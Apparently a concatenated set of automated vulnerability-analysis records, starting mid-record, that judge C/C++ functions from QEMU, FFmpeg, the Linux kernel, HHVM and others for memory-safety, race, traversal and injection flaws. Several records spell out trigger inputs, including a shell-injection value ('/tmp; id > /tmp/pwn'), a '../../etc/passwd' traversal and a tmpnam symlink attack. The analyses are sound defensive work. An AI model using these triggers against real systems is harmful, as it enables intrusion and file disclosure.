evidence.reason: The mutex that guards ram_list (acquired at line 7 and released at line 20 on the error path) is released at line 49, yet the shared dirty-memory bitmaps ram_list.dirty_memory[i] are still resized at lines 55-57 via bitmap_zero_extend, which reallocs and frees the old array. Any concurrently running dirty-bitmap accessor (vCPU dirty marking, migration iteration — lock-free index/scan accessors) that interleaves between the unlock and the realloc either dereferences the freed old array (use-after-free) or writes bit indices for the newly published block's pages beyond the not-yet-extended array (heap out-of-bounds write). Additionally, old_ram_size (used as the 'current size' argument to bitmap_zero_extend) was sampled at line 6 before the lock was acquired, so it can be stale relative to the actual bitmap size under concurrent modification. No lock, barrier, or atomic protection exists between lines 49 and 58.

evidence.snippet:
old_ram_size = last_ram_offset() >> TARGET_PAGE_BITS;
    qemu_mutex_lock_ramlist();
evidence.reason: Origin of the tainted stale value: old_ram_size, later consumed as the assumed current bitmap size by bitmap_zero_extend (line 57) and by migration_bitmap_extend (line 29), is read from the shared block list BEFORE qemu_mutex_lock_ramlist() is acquired. Between this read and its use, other threads can add/remove RAM blocks, making old_ram_size inconsistent with the actual dirty-memory bitmap size — the root of the under-extension/over-extension defect exploited by the race in the primary evidence.

assumptions: find_ram_offset is assumed to return a valid free offset consistent with the block list; its implementation is not shown.
bitmap_zero_extend is assumed to resize via g_realloc (may move and free the old array) and to zero bits [old_nbits, new_nbits) — standard allocation/copy semantics.

cpu_physical_memory_set_dirty_range is assumed to set dirty bits for page indices up to (offset+used_length)>>TARGET_PAGE_BITS in the shared ram_list.dirty_memory arrays — standard container/index-accessor semantics.

Concurrent vCPU and migration threads are assumed to access ram_list.dirty_memory without holding the ram_list mutex (structural QEMU behavior not shown in this snippet); this underlies the concurrency trigger.

Callers of this static function (qemu_ram_alloc paths) are internal; new_block->max_length and used_length originate from memory backend / hotplug configuration, and no statement in this code validates them against offset wraparound.
limitations: Integer overflow candidate: new_block->offset + new_block->max_length (line 27) can theoretically wrap ram_addr_t and yield an undersized new_ram_size, causing cpu_physical_memory_set_dirty_range to write past the bitmap. Trigger is speculative: it requires allocations near the ram_addr_t maximum (multiple exabytes), which no statement in this code's input surface instantiates; phys_mem_alloc at line 14 would fail first.

Unchecked xen_ram_alloc return value (lines 11-12): on the Xen path a failure would leave new_block->host NULL while the block is still published. Xen allocation failure is environment/OS failure not inducible by an attacker, and the callee's failure behavior is not shown.
return -1 (line 21) as an unsigned ram_addr_t sentinel: the caller's handling of this sentinel is not shown, so no impact chain could be instantiated.

Two strictly concurrent ram_block_add invocations may additionally be serialized by QEMU's global BQL outside this code; the primary trigger instead relies on concurrent lock-free dirty-bitmap accessors (vCPU/migration threads), which is the assumed interleaving party.

verdict.summary: remove_rule only frees internally-owned fields (the suspend tag) and the rule itself after unlinking it from the list in the correct order; no attacker-derived value reaches a memory, index, size, or injection sink, and no trigger precondition for the candidate defects (NULL rule, out-of-enum action, shared tag) can be instantiated from the given code.

assumptions: The caller of remove_rule (static, internal) passes a non-NULL rule that is linked in the 'next' list; no statement in this code documents or enforces that contract, so it is an assumption, not a quoted guard.

rule->action is assumed to hold only the three enumerated constants because the rule-construction/parsing code that populates it is not shown; the switch has no default arm, so an out-of-range value would silently leak rule->options (a bounded leak, no corruption).

rule->options.suspend.tag is assumed to be a heap pointer owned solely by this rule; if construction code ever shares tag pointers between rules, line 8 would double-free, but no aliasing statement is quotable here.
limitations: NULL-deref candidate at 'switch (rule->action)': triggering requires a caller passing NULL; no statement in this code produces NULL (no allocation/lookup failure path exists here), so the trigger is speculative — a same-process crash with no corruption, bypass, or amplification; recorded as a robustness concern only.

Potential use-after-free of the suspend tag or rule if a coroutine suspended via the tag remains pending after rule removal (blkdebug resume path) — that consumption happens entirely in code not shown and this function passes no out-of-domain argument at any call site, so the impact chain cannot be instantiated here.
Missing default arm in the switch on rule->action would leak option memory for a hypothetical future/unvalidated action value; the value's producer is outside this code and not characterizable.

verdict.summary: PipeSocketHandler::connect copies the attacker-controlled endpoint name into the fixed-size sockaddr_un.sun_path stack buffer with strcpy and no length validation, allowing a stack buffer overflow with attacker-controlled content when the name exceeds sizeof(sun_path) (108 bytes on Linux).

evidence.snippet:
remote.sun_family = AF_UNIX;
  strcpy(remote.sun_path, pipePath.c_str());
evidence.reason: Sink: strcpy copies pipePath (arbitrary-length attacker-controlled endpoint name) plus its NUL terminator into the fixed 108-byte sun_path member of the stack-allocated sockaddr_un 'remote'; no length check exists anywhere in the function, so any name longer than the buffer overflows adjacent stack memory (attacker-controlled bytes).

evidence.snippet:
string pipePath = endpoint.name();
  sockaddr_un remote;
evidence.reason: Origin of the tainted value: endpoint.name() is a content-bearing parameter of the public connect method (attacker-data); it flows unmodified to the strcpy sink at line 11.

assumptions: FATAL_FAIL is assumed to abort/throw on failure, so the negative-socket-fd path at line 8 terminates execution before any fd use.
sockaddr_un.sun_path is assumed 108 bytes (Linux layout), the standard size for this struct on the target platform.
limitations: select() return value is ignored; if select fails, FD_ISSET still sees the bit set at line 33, but the subsequent getsockopt(SO_ERROR) check at line 42 correctly handles the real socket state, so no security defect was instantiated.
VLOG/LOG statements embed the attacker-controlled endpoint name; potential log forging (CWE-117) exists but was judged cosmetic/low-impact and not promoted.
The exact privilege of the caller supplying the SocketEndpoint is not shown; per the trust-boundary rule, the data-carrying parameter of this non-static method is treated as attacker-data.

verdict.summary: In unpack_vectors(), the macroblock number read from the stream-derived table s->superblock_macroblocks is used to index s->macroblock_coding (line 28) BEFORE the bounds check 'if (current_macroblock >= s->macroblock_count)' (line 30) executes, and the only prior guard tests the single value -1. An out-of-range entry (>= macroblock_count, or negative other than -1) causes an out-of-bounds read at line 28; negative values additionally bypass the later check entirely and propagate to further out-of-bounds indexing of s->macroblock_fragments.

evidence.reason: Use-before-check out-of-bounds read: current_macroblock comes from the attacker-influenced decode table superblock_macroblocks (line 26). The condition on line 27-28 evaluates s->macroblock_coding[current_macroblock] whenever current_macroblock != -1, with no range or lower-bound guard in place; the check 'current_macroblock >= s->macroblock_count' exists only at line 30, i.e., after the out-of-bounds access. Trigger: a decoded frame in which a superblock_macroblocks entry equals macroblock_count or larger (the code's own line-30 error path documents that such values are anticipated), causing macroblock_coding[current_macroblock] to be read out of bounds on entry to the j-loop before the error return. A negative entry other than -1 additionally passes both line 27 and line 30 and drives further OOB accesses via macroblock_fragments[current_macroblock * 6].

assumptions: s->macroblock_count bounds the sizes of s->macroblock_coding and s->macroblock_fragments, and s->fragment_count bounds s->all_fragments, as implied by the code's own comparisons at lines 30 and 36.

s->u_superblock_start bounds the valid index range of s->superblock_macroblocks for the expression i * 4 + j; the producer of superblock_macroblocks (frame-header parsing elsewhere in the decoder) is not shown.
get_bits(gb, 6) returns a value in [0, 63]; the declared sizes of motion_vector_table and fixed_motion_vector_table are outside the given code.
limitations: motion_vector_table[get_vlc2(...)] and fixed_motion_vector_table[get_bits(gb, 6)]: if get_vlc2 can return a failure sentinel (-1) on a malformed code, motion_vector_table[-1] would be an out-of-bounds read; similarly fixed_motion_vector_table[63] would be out of bounds if that table has fewer than 64 entries. Neither the VLC failure behavior nor the table sizes are shown in the given code, so these triggers cannot be fully instantiated here.

A superblock_macroblocks entry that is negative but not exactly -1 would bypass every check in this function and could turn the s->all_fragments[current_fragment].motion_x assignment into an out-of-bounds WRITE (CWE-787); no statement in the given code produces such an entry and the producer is not shown, so this escalation remains speculative.

macroblock_fragments entries other than -1 that are negative would likewise bypass the fragment checks (only '== -1' and '>= fragment_count' are tested); reachability depends on the not-shown producer.

verdict.summary: All attacker-controlled header values (pktsize, width, height, levels, depth) are validated by quoted checks that execute before every sink: the packet-size check bounds pktsize within the actual packet and above 44 bytes; the dimension check is performed in unsigned arithmetic (the 1U literal converts the signed operand), so both overflow-scale and sign-bit-set (negative) width/height values are rejected, and the remaining zero case fails in ff_set_dimensions with a checked error return; levels must exactly equal NB_LEVELS and depth is range-checked 8-15 before any decoding or postprocessing uses them. All callee results are checked with early returns. No reachable defect found.

assumptions: ff_set_dimensions is FFmpeg's documented dimension-validation API (rejects non-positive dimensions via av_image_check_size); its error return is checked here with 'if (ret < 0) return ret;'.

ff_thread_get_buffer allocates the frame at max(width, coded_width) per the FFmpeg decode contract; coded dimensions were set to the aligned (w, h) by ff_set_dimensions, so postprocess_luma/postprocess_chroma over ctx->w x ctx->h stay in bounds.
bytestream2 documented semantics: reads past the end return 0 and bytestream2_skip clamps; pktsize > 44 guarantees the 44 header bytes exist.

decode_plane, init_decoder, postprocess_luma/chroma, free_buffers are not shown; this code passes them only validated values (levels == NB_LEVELS, depth in [8,15], positive w/h consistent with the allocated frame).
NB_LEVELS is a positive compile-time constant (4 upstream); the shift 1U << (NB_LEVELS + 1) is assumed in-range.
limitations: 'version != 1' is only logged via avpriv_request_sample, not rejected; version is never used afterward, so this is a robustness/correctness note, not a security defect.

With AV_CODEC_FLAG_GRAY set by the application (not the bitstream author), chroma planes are not decoded before postprocess_chroma reads them; whether that reads uninitialized data depends on unshown FFmpeg buffer-pool allocation semantics, so the trigger is not instantiated.

pktsize is only validated against the current packet's remaining size; it is not validated as 'large enough for all subband data' — bytestream2 EOF behavior (returns 0) and the not-shown decode_plane handle short data; no out-of-bounds access is producible from within this function.

verdict.summary: No instantiated vulnerability. info_content is sanitized of all CR/LF characters (the only header-splitting delimiters) via a correct erase-remove idiom before being stored in the header map; the array index used for the header key is guarded by an explicit -1 sentinel check; parse_header uses bounds-safe std::string operations with guaranteed loop termination (each iteration erases at least one character); output is echoed only to the same local user who supplied it.

assumptions: Assumed standard library semantics per discipline 3: std::remove moves all matching characters, std::string::erase/substr are bounds-checked, std::map::operator[] inserts or assigns.
limitations: parse_header does not strip CR/LF from keys/values parsed from argv[3], and print_header_in_python_format does not escape quotes; a real HTTP-response emitter consuming this map could enable header injection (CWE-113) or output-format breakage, but no such consumer exists in the given code, so the impact chain is not instantiated.
parse_header splits values on ':' and ',' which can truncate values containing those characters — a correctness/parsing limitation, not a security defect.

verdict.summary: write_results() generates a predictable temporary file name with tmpnam() (line 21) and then creates the file non-atomically with fopen(filename, "w") (line 27), with no exclusive-creation guard (no O_EXCL/mkstemp/lstat) anywhere in the code. A local attacker can predict or pre-plant a symlink at the tmpnam-generated path between name generation and fopen, causing fputs() (line 33) to truncate and overwrite an arbitrary victim file with the caller-supplied results content, or to disclose results to the attacker. Classic insecure-temporary-file / link-following vulnerability.

evidence.reason: Root cause: tmpnam() produces a guessable name without creating or reserving the file, and fopen(filename, "w") opens it non-exclusively in a separate step, leaving a TOCTOU window. Trigger instantiated: attacker pre-creates /tmp/aaaaaa01 -> victim symlink (name predictable from tmpnam's sequence), fopen("w") follows the symlink and truncates the victim, and fputs(results, temp_file) (line 33) writes caller-controlled content into it. No O_EXCL, mkstemp, fd-based creation, or lstat check exists anywhere in the code.

evidence.snippet: if (fputs(results, temp_file) == EOF) {
evidence.reason: The sink through which the hijacked FILE* (from fopen on the attacker-redirected path) receives the caller-supplied `results` content, completing the arbitrary-file-overwrite impact chain opened at line 27.

assumptions: `results` is assumed NUL-terminated; the only visible caller passes argv[1], which is NUL-terminated, so no unbounded-read trigger is instantiable from the given code.
Impact model assumes a multi-user host where a local unprivileged attacker shares the temp directory with this process (standard CWE-377 threat model for tmpnam).
limitations: Minor: the created temp file is never unlinked and inherits the process umask (may be world-readable), and the unused variable `fd` (line 18) suggests an abandoned secure fd-based design; neither changes the primary verdict.
No integer/bounds defect exists: tmpnam's output fits L_tmpnam per the C standard, and all allocation and error paths in the code are checked and freed correctly.

verdict.summary: celt_denormalize() uses the attacker-derived bitstream fields f->start_band, f->end_band and f->size with no validation: the loop at line 4 lets i index the 21-entry ff_celt_freq_bands / ff_celt_freq_range / ff_celt_mean_energy tables and block->energy out of bounds, and f->size shifts offsets/counts without any relation to the length of data. The resulting dst[j] *= norm at line 9 writes out of bounds of the frame buffer for a crafted Opus/CELT packet, corrupting the decoding process's memory.

evidence.reason: Out-of-bounds write: the pointer offset (ff_celt_freq_bands[i] << f->size), the write count (ff_celt_freq_range[i] << f->size), and the index i itself all come from unvalidated attacker-data (f->end_band, f->size, parsed band values). No bounds check, clamp, mask, or buffer-length relation exists anywhere in the function, so for e.g. end_band=25 with size=0, i reaches 21..24, reads the band tables and block->energy out of bounds, and dst[j] *= norm writes attacker-influenced memory outside data.

evidence.snippet: for (i = f->start_band; i < f->end_band; i++) {
evidence.reason: Origin of the tainted loop control: f->start_band and f->end_band are bitstream-derived fields consumed here as the only loop bound, with no independent limit such as a CELT_MAX_BANDS check; this is the missing guard whose absence is the defect.

assumptions: ff_celt_freq_bands / ff_celt_freq_range / ff_celt_mean_energy are the standard 21-entry (CELT_MAX_BANDS) constant tables and block->energy has CELT_MAX_BANDS entries; their definitions are not shown, but no statement in the given code bounds i to any smaller domain either way.
data points to a frame buffer whose length is determined elsewhere (not shown); the function receives no length parameter, so no in-function guard could relate f->size or the band range to it.

The field values are populated by the Opus/CELT bitstream parser (code not shown); per the analysis rules, since this code documents and checks no precondition on them, they are treated as attacker-data at this entry point.
limitations: The parse statements that actually set f->start_band / f->end_band / f->size from the bitstream are not part of the given code; if an upstream, unquoted check bounds them to [0,21] and a size consistent with data, the OOB trigger would be blocked there — but no such check can be quoted from the given code, so it cannot dismiss the candidate.
exp2f(FFMIN(log_norm, 32.0f)) at line 7 is a correct, present clamp: norm is bounded by 2^32, so the float-magnitude path is not a defect.

verdict.summary: get_codec_data parses an attacker-supplied media file: in the NUV_EXTRADATA case it sets extradata_size from an attacker-controlled 32-bit size, allocates with av_malloc(size), and immediately calls get_buffer(pb, extradata, size) without checking the allocation result. A crafted file whose size field exceeds allocatable memory makes av_malloc return NULL, and get_buffer then writes attacker bytes through the NULL pointer with attacker-controlled length, crashing the parsing process (denial of service on the player/server consuming the file). No NULL check, clamp, or error arm exists on any path between allocation and use.

evidence.reason: Root cause: the result of av_malloc(size) is never checked against NULL before being passed as the destination buffer to get_buffer together with the same attacker-controlled size (e.g., le32 size 0xFFFFFFF8 in an NUV_EXTRADATA frame with subtype 'R'). av_malloc fails and returns NULL; get_buffer(pb, NULL, size>0) then performs a write through the NULL pointer of attacker-chosen length, crashing the process that parses the attacker's file. Trigger fully instantiated: frametype/subtype/size all come from get_byte/get_le32 on the input stream (lines 8, 11, 13), the branch 'if (vst && subtype == 'R')' (line 14) is taken, and no statement between allocation (line 16) and use (line 17) tests the allocation sentinel.

assumptions: The PKTSIZE macro body is not shown; its semantics are unknown and it is relied on neither as a guard nor as a defect source.
Standard FFmpeg semantics assumed per discipline 3: av_malloc returns a pointer or NULL; get_buffer copies file bytes into the destination buffer; get_le32 returns a 32-bit value from the stream.
limitations: If av_malloc fails, extradata_size is left non-zero with extradata == NULL; any harmful consumer of this inconsistent state is outside the given code, so that impact is not instantiated here.
A negative int size (le32 >= 0x80000000) reaching url_fskip performs a backward seek / no memory access; no security impact demonstrated within this code.
Attacker-set sample_rate/bits_per_sample/channels/codec_tag are stored but their downstream use is not shown; no defect provable at these stores.

verdict.summary: keyctl_read_key validates the looked-up key reference (IS_ERR check), enforces read permission (key_permission with KEY_NEED_READ, plus the possession fallback gate), and validates the key under key->sem before dispatching to key->type->read; buffer/buflen are passed unchanged into the documented ->read/copy_to_user interface. Remaining candidates fail full instantiation: the possession-fallback read (CWE-862 candidate) only harms in a deployment/policy scenario whose contract ('possession does not authorize reading') is not quotable from this code — the code's own comment documents possession as the intended authority for that path; the permission-check TOCTOU (check outside key->sem, only key_validate under the lock) has a real window but the impact link (disclosure of content the reader did not already legitimately hold) is not instantiated; and the refcount-leak path via 'if (ret != -EACCES) goto error;' without key_put requires key_permission to return an errno other than 0/-EACCES, which no statement in this code can produce.

assumptions: key_permission, is_key_possessed, key_validate, key_ref_to_ptr, key_put, down_read/up_read, and key->type->read are project-internal kernel callees not shown in the given code; their semantics (key_permission returns success or -EACCES, key_validate checks revocation/expiry, read methods copy min(buflen, datalen) to the user buffer) are relied on only as documented kernel interfaces and were not treated as enforceable contracts for dismissing memory-safety candidates.
lookup_user_key(keyid, 0, 0) returns a reference that is either an IS_ERR error or a valid key reference; this is the only producer of key_ref and its result is checked at the first use.
limitations: Possession-based read (CWE-862 candidate): a possessed key whose read permission is denied to everyone, including the possessor, is still read by this code because the -EACCES path falls through to can_read_key whenever is_key_possessed(key_ref) is true, and key_validate under the semaphore checks only revocation/expiry, not read permission. This matches the upstream Linux design intent ('the key is probably readable - now try to read it'); I could not instantiate a victim across a trust boundary because the harming scenario requires an unquoted policy contract that possession never grants read authority.

TOCTOU on read permission (CWE-362-style): key_permission(key_ref, KEY_NEED_READ) at the top of the function runs before down_read(&key->sem), and no permission recheck occurs between the lock and key->type->read; a concurrent setperm/update can interleave. The window is exhibit-able, but the simulated disclosure is limited to content the reader could legitimately read moments earlier; the 'new secret disclosed' impact link is not produced by any statement in this code.

Potential key reference leak: 'if (ret != -EACCES) goto error;' jumps past the 'error2:' key_put(key) label. This leaks the reference only if key_permission(key_ref, KEY_NEED_READ) returns an errno other than 0/-EACCES; no statement in this code can produce such a value, so the trigger is speculative.
Error-code flattening: lookup failures are reported as -ENOKEY regardless of the underlying error (e.g., -EKEYREVOKED, -EKEYEXPIRED). This is a diagnostics issue with no security impact.

verdict.summary: matchString dereferences *p at entry with only `assertx(p <= m_end)` preceding it, which admits p == m_end (and is typically compiled out of release builds); no p < m_end / emptiness check exists anywhere before the dereference. When the parser invokes matchString with the buffer fully consumed (a state this function itself produces via `m_buf = p;` after a match ending exactly at m_end, e.g. on a truncated attacker-supplied serialized payload), `*p` performs a one-byte out-of-bounds read past m_end. Both branch bounds checks (`if (p + total > m_end) return false;`) occur only after the dereference, so they cannot protect it. The OOB byte is never disclosed (both paths return false), but the read can fault if m_end abuts an unmapped page, crashing the higher-privileged process parsing the data (denial of service at minimum).

evidence.reason: Root cause: `*p` is dereferenced at entry with no check that p < m_end. The only preceding statement, `assertx(p <= m_end);`, uses `<=` and therefore explicitly admits p == m_end as a legal entry state (and is an assertion, not a runtime guard). Instantiated trigger: a prior call that consumes a matched string ending exactly at m_end (permitted by `if (p + total > m_end) return false;` with `>`) executes `m_buf = p;` leaving m_buf == m_end; a subsequent matchString call on the truncated attacker-supplied payload then reads `*m_end` out of bounds. The first real bounds checks appear only inside the branches, after the dereference. The minimal missing guard is `if (p == m_end) return false;` before line 5, and no fix form (bounds/emptiness check, clamp, mask, corrected operator, checked accessor, error arm before first use) appears anywhere on any path.

assumptions: `assertx` behaves like a debug assertion and may be compiled out of release builds; even when active it permits p == m_end.
m_buf/m_end delimit the serialized stream being parsed (member invariant maintained by the unserializer); for the general unserialize surface the stream content is attacker-controlled.
`type() == VariableUnserializer::Type::APCSerialize` is internal configuration set by the constructing subsystem; no statement in this code constrains which buffer accompanies that mode.
limitations: Speculative: the 'S' branch reads a raw pointer from the stream (`auto const sd = *reinterpret_cast<StringData*const*>(p);`) and dereferences it (`sd->slice()`, `assertx(sd->isStatic())` is debug-only). If attacker-crafted bytes could reach an APCSerialize-mode unserializer, this would be an arbitrary-pointer dereference. The trigger precondition (attacker bytes under an APCSerialize-mode unserializer) could not be instantiated from the given code, since the mode gate is internal configuration and APC blobs are produced by the in-process serializer; recorded, not counted.
The `*reinterpret_cast<StringData*const*>(p)` read at m_buf+2 may be unaligned (UB, potential fault on strict-alignment targets); no security impact on x86-64 targets HHVM runs on.

The one-byte OOB read at p == m_end does not disclose the byte's value (both branches return false after their bounds checks), and a fault requires m_end to abut an unmapped page; practical impact is limited to a potential denial of service.
`if (ss >= 100) return false;` causes matchString to reject expected strings of length >= 100 — a functional limitation, not a security defect.

verdict.summary: validate_event() calls armpmu->get_event_idx() (line 16) where armpmu is derived via to_arm_pmu(event->pmu) without any check that event->pmu is the arm PMU performing validation; the only pmu gate (event->pmu != leader_pmu) compares against the group leader's pmu. For a group led by a non-arm, non-software PMU event (e.g., a breakpoint event) visited during group validation of an arm event, to_arm_pmu fabricates a wild pointer from a struct pmu not embedded in an arm_pmu, and get_event_idx becomes an indirect call through an out-of-bounds-read function pointer — a kernel memory-safety violation triggered by an unprivileged perf_event_open user.

evidence.snippet: return armpmu->get_event_idx(hw_events, event) >= 0;
evidence.reason: Sink: indirect call through armpmu->get_event_idx with no check that armpmu is the validating arm PMU; when validate_event is invoked on a group member whose pmu equals the leader's pmu but is a non-arm, non-software pmu, this calls a function pointer loaded from out-of-bounds/wild memory.

evidence.snippet:
struct arm_pmu *armpmu = to_arm_pmu(event->pmu);
	struct pmu *leader_pmu = event->group_leader->pmu;
evidence.reason: Origin of the faulty value: to_arm_pmu (container_of) is applied to event->pmu, which may be a foreign pmu; the only subsequent gate, event->pmu != leader_pmu, compares against the group leader's pmu rather than the arm PMU, so it never establishes that event->pmu is an arm_pmu.

assumptions: event (pmu, group_leader, state, attr) originates from an unprivileged perf_event_open syscall across a trust boundary; this function is the validation intake for that data.
to_arm_pmu is a container_of with no runtime type check, so applying it to a pmu not embedded in an arm_pmu yields a wild pointer.
is_software_event returns false for non-software pmus such as the breakpoint pmu.
limitations: Speculative: event->group_leader may be NULL at line 5 — no NULL check exists, but no statement in this code's own flow produces a NULL group_leader, so the trigger is not instantiated here.

The exact caller that walks the group leader/siblings is not shown; per the attacker model the function's parameters are treated as attacker-data, and this matches the historically upstream-fixed bug (fix changed the signature to take the validating pmu and reject event->pmu != pmu).

verdict.summary: read_file_from_dir concatenates attacker-controlled filename onto dir_path with no canonicalization or traversal filtering, then fopen's the result, allowing arbitrary file disclosure.

evidence.reason: Path traversal: filename and dir_path are attacker-supplied strings; the composed path is passed unvalidated to fopen. With filename="../../etc/passwd" (or an absolute path), the OS resolves the traversal and the function returns the file's contents, which main prints via printf("%s", content). No statement in the code checks for '/' or '..' components, calls realpath, or compares the resolved path against dir_path.

limitations: realloc results are never checked (content = realloc(...)); on allocation failure content[content_size++] = ch writes through NULL. Trigger requires OOM, not attacker-instantiated in the given 1-byte-at-a-time flow.

char ch = fgetc(file) compared against EOF: on platforms where char is unsigned, a 0xFF byte in the file makes the loop never terminate, causing unbounded realloc growth (memory exhaustion). Platform-dependent, not instantiated on signed-char targets.

verdict.summary: Commit metadata validation is fail-closed and memory-safe: the memcmp length is pinned by a size-equality guard ('xa_metadata_size != required_metadata_size ||') that short-circuits before the comparison, xa_metadata's readability for the compared length is guaranteed by g_variant_get_string, and every attacker-controlled path (missing key, size mismatch, byte mismatch, malformed commit_data) results in PERMISSION_DENIED or the policy-defined pass. No attacker-reachable defect with an instantiated trigger was found.

assumptions: The caller supplies required_metadata as a buffer holding at least required_metadata_size readable bytes; this code does not document or assert that contract (unquotable), but the value pair is local operator-side data, not trust-boundary input, and the memcmp reads exactly required_metadata_size bytes.

commit_data is assumed to be a validated, normal-form GVariant as produced by the ostree/flatpak commit-loading machinery; this code's own guards (NULL check on commit_metadata, typed lookup) handle malformed shapes fail-closed.

g_variant_get_string is relied on per documented GLib semantics: returns a NUL-terminated pointer with a byte count (including the NUL) that the variant's serialized data provably contains; xa_metadata_size may therefore include the terminating NUL, a sizing convention that must match the caller's required_metadata_size convention.
ref is assumed to be an ostree-validated ref name; it is used only as a %s argument to a constant format string, so it cannot inject format directives.
limitations: C1 (speculative): if a caller ever passed a required_metadata_size larger than the actual required_metadata buffer, line 22's memcmp (running only when xa_metadata_size == required_metadata_size) would read out of bounds. The trigger requires a caller contract violation that no statement in this code can produce; not instantiated, so not a vulnerability here.

C2: if the caller computes required_metadata_size without the terminating NUL while g_variant_get_string's length includes it, every legitimate commit would be rejected (fail-closed false rejection). This is an availability/correctness hazard for the legitimate path, not a security bypass.

C5: an attacker-influenced ref with embedded newlines is interpolated into a GError message; if a caller later writes that message into a log without sanitization, log forging (CWE-117) would occur in that not-shown consumer, not in this code.
g_variant_get_child_value on a malformed commit_data emits a GLib CRITICAL warning and returns NULL; the code handles NULL fail-closed, so this is robustness-only.

verdict.summary: No reachable, unguarded security sink found. The single buffer-indexing sink r_anal_op(anal, &aop, addr, buf + i, bsize - i, ...) is provably kept in-bounds on every iteration by the quoted guard 'if (i >= (bsize - 32)) { i = 0; }', even though the constraint-check loop 'for (i = 0; i < MAX_INSTR; i++)' clobbers the buffer offset index i (a correctness/misalignment bug only). All string sinks (strncpy into prev_type, strstr uses) are length- or NULL-guarded; callee calls pass only in-domain names/addresses/sizes.

assumptions: aop.refptr is byte-sized (ut8) so 'aop.refptr * 8' reads at most 255 bytes from the 256-byte local buffer in r_read_ble; the given code only guards 'aop.ptr && aop.refptr && aop.ptr != UT64_MAX' and does not itself cap refptr below 255.
r_anal_op respects the length argument (bsize - i) passed to it and does not read past it.
r_anal_block_contains, r_anal_fcn_bbget_in, anal_emul_init, get_src_regname, type_match, and ht_pp_new_size behave per their (not shown) contracts, including NULL/zero handling.
var->type returned by r_anal_get_used_function_var is non-NULL when var is non-NULL (strncpy source).
sdb_num_get returns 0 for missing keys; loop_count values are only ever written by this code (0..LOOP_MAX), so no signed truncation of a wrap value occurs.
limitations: Correctness bug (not a memory-safety defect): the constraint-scan loop reuses the buffer offset variable i ('for (i = 0; i < MAX_INSTR ; i++)'), so subsequent iterations decode buf at an offset misaligned with addr until i is reset; all accesses remain in-bounds due to the top-of-loop guard, and the only impact is inaccurate type propagation.

Potential NULL dereference if r_anal_fcn_bbget_in returns NULL (attacker-chosen jump target outside all blocks) and the internal r_anal_block_contains lacks a NULL check; callee not shown, impact link not characterizable.

Potential NULL dereference of core->dbg->trace->ht or anal->esil->trace->db if anal_emul_init leaves them unset; state not producible by any quoted statement and depends on operator session setup, not the analyzed file.

Early returns ('if (!_pc) { free (buf); return; }' and the in-loop 'if (!r) { free (buf); return; }') leak hc/pc/next_op/aop and skip r_cons_break_pop/anal_emul_restore; their triggers (register-name lookup failure) are not attacker-instantiable, so these are robustness issues.

buf is malloc'd uninitialized and r_io_read_at may under-fill it, so the disassembler can consume uninitialized heap bytes; no quoted path leads from those bytes to disclosure, control flow, or corruption.
ht_pp_new_size (fcn->ninstr * 0xf, ...) and ht_pp_new_size (fcn->ninstr, ...) behavior for ninstr == 0 or very large ninstr is not shown; failure mode assumed handled by the callee.

verdict.summary: The code uses mkstemp (atomic, O_EXCL, mode 0600) and checks every failure sentinel (mkstemp, fdopen, fputs, fclose, strdup). Attacker-controlled string content flows only through fputs into an owner-only temp file — no format string, injection, bounds, or lifetime defect. The returned filename is consumed via printf with a constant format. No guard is missing that any instantiated trigger requires.

assumptions: mkstemp/fdopen/fputs/fclose/strdup behave per POSIX/standard documented semantics (discipline 3).
argv[1] on the shown call path is a NUL-terminated non-NULL string, guaranteed by the argc==2 check in main.
limitations: If a future caller passes NULL as results, fputs(NULL, ...) dereferences NULL — a crash of the caller's own process at equal privilege (robustness, CWE-476-shaped), not instantiated by any shown call.

The returned temp filename is intended for 'further reading' by a consumer not shown; if that consumer reopens the file by name without re-validating, a name-based TOCTOU (CWE-377-shaped) could exist in that consumer, but the impact chain is outside this code and mkstemp's 0600/O_EXCL semantics close the classic race here.
Error paths (fputs EOF, fclose failure) return without unlinking the temp file, leaking a small 0600 file per failed call; not attacker-scalable in the code as given.

verdict.summary: secure_check parses an attacker-supplied firmware image but passes the header field header->file_size directly as the length argument to secure_decrypt (operating on data + sizeof(*header)) without any bounds validation anywhere in the function, giving the image author control over the number of bytes processed past the buffer.

evidence.snippet:
file = (unsigned char *)data + sizeof(*header);
	ret = secure_decrypt(file, header->file_size, 1);
evidence.reason: header->file_size is attacker-controlled content of the parsed image header; the only checks performed are the header decrypt success (line 7) and magic comparison (line 11) — no statement on any path bounds file_size before it is used as the length for the decrypt call operating at data + sizeof(*header), an unchecked attacker-derived size passed to a memory-processing call.

evidence.snippet: int secure_check(void *data)
evidence.reason: Entry point: data carries the attacker-supplied firmware image; the header fields (including file_size) consumed at line 15 originate here across the trust boundary.

assumptions: The struct at91_secure_header_t and the backing buffer size of data are not shown; the exact width of file_size and the total buffer bound could not be quoted from the given code.
secure_decrypt's internal semantics (failure return value, whether it reads/writes exactly length bytes) are not shown; it is treated as a memory-processing operation per the call-site argument flow.
limitations: The actual out-of-bounds access occurs inside secure_decrypt, which is not shown; the concrete overflow magnitude and crash site cannot be simulated within this code, which is why CWE-20 (improper input validation) is reported rather than CWE-787.

verdict.summary: get_ls_result interpolates the user-provided dir_path directly into a shell command string and passes it to popen() without any validation or escaping, allowing arbitrary command injection (e.g., dir_path = "/tmp; <attacker command>") with the privileges of the process.

evidence.reason: dir_path is attacker-controlled (user-provided per the function's own docstring; passed unvalidated from argv[1]). snprintf only bounds the buffer write, not the shell semantics of the content; popen then executes the string via /bin/sh. Trigger: dir_path = "/tmp; id > /tmp/pwn" produces command "ls -l /tmp; id > /tmp/pwn", and popen executes the attacker's command. No validation, escaping, or quoting of dir_path exists anywhere on any path in the code.

assumptions: popen is assumed to invoke the command through a shell (/bin/sh -c), which is its documented standard behavior per discipline 3.

argv[1] / dir_path is treated as attacker data because get_ls_result is a non-static exported function whose own docstring declares the parameter user-provided; no documented caller precondition exists in the code.
limitations: On the popen-failure path, get_ls_result returns a pointer to the string literal "" (line 21), which main later passes to free(output) (line 55) — an invalid free of non-heap memory. Trigger requires popen to fail (fork/pipe/resource failure), which no attacker-instantiable statement in this code produces, so it is not counted as a vulnerability here.

realloc results at lines 29 and 37 are unchecked; failure would cause a NULL-pointer write at lines 30/38. The trigger is allocation failure, not produced by the code's own data flow (output volume is bounded by what the ls command emits), so this is recorded as a robustness/defensive issue.

fgetc's int return is stored in a plain char (line 28); on platforms where char is unsigned, EOF (-1) would never compare equal and the read loop would not terminate. This is target-conditional behavior and was not counted.
snprintf truncates commands built from paths longer than ~1015 bytes, but command injection already succeeds well below that limit, so truncation adds no distinct defect.

